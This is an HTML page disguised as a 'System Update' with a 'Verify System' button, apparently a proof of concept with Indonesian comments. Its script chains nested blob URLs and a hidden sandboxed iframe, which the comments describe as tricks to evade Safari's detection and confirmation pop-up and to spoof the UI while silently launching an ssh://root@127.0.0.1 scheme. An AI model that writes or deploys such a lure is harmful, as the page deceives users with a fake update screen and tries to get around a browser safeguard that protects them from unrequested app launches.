<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #1a1a1a;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    user-select: none;
  }
  button {
    padding: 15px 30px;
    font-size: 18px;
    background: #007aff;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-weight: bold;
  }
  iframe { display: none; }
</style>
</head>
<body>

<button id="startBtn">Verify System</button>

<script>
(function () {
  'use strict';

  document.getElementById('startBtn').addEventListener('click', function() {
    
    // Skema target yang ingin dibuka
    var targetScheme = "ssh://root@127.0.0.1";

    // ============================================
    // TRIK 1: DOUBLE BLOB JUMP (Menghindari Deteksi Safari)
    // ============================================
    // Kita membuat Blob pertama yang berisi script untuk membuat Blob kedua.
    // Redirect terjadi dari Blob kedua, yang mungkin dianggap Safari sebagai 
    // "internal execution" dan melewati pop-up eksternal.

    var innerPayload = `
      <!DOCTYPE html>
      <html>
      <body>
        <script>
          // Redirect diam-diam (Silent)
          window.location.replace("${targetScheme}");
        <\/script>
      </body>
      </html>
    `;

    // Blob Pertama (Wrapper)
    var wrapperPayload = `
      <!DOCTYPE html>
      <html>
      <body>
        <script>
          // Buat Blob kedua di dalam Blob pertama
          var innerHTML = \`${innerPayload}\`;
          var innerBlob = new Blob([innerHTML], { type: 'text/html' });
          var innerUrl = URL.createObjectURL(innerBlob);
          
          // Redirect ke Blob kedua (memicu navigasi top-level dari dalam Blob)
          window.location.replace(innerUrl);
        <\/script>
      </body>
      </html>
    `;

    var outerBlob = new Blob([wrapperPayload], { type: 'text/html' });
    var outerUrl = URL.createObjectURL(outerBlob);

    // ============================================
    // TRIK 2: IFRAME SANDBOX (Untuk UI Spoofing)
    // ============================================
    // Kita coba juga eksekusi via iframe yang tersembunyi.
    // Safari kadang mengizinkan redirect skema dari iframe tanpa pop-up.
    
    var iframe = document.createElement('iframe');
    iframe.sandbox = "allow-scripts allow-top-navigation";
    iframe.src = outerUrl;
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    // Trik 3: Langsung navigasi tab utama
    window.location.replace(outerUrl);
  });

})();
</script>
</body>
</html>
